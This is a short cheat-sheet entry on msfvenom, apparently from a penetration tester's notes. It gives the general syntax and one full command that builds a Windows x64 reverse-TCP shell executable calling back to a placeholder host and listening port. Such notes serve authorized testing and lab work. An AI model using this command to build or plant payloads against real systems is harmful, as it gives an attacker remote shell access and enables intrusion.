# msfvenom
```
# For more info, check the dedicated notes: msfvenom.md
msfvenom -p <PAYLOAD> <OPTIONS>
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=HOST_IP LPORT=LISTENING_PORT
```
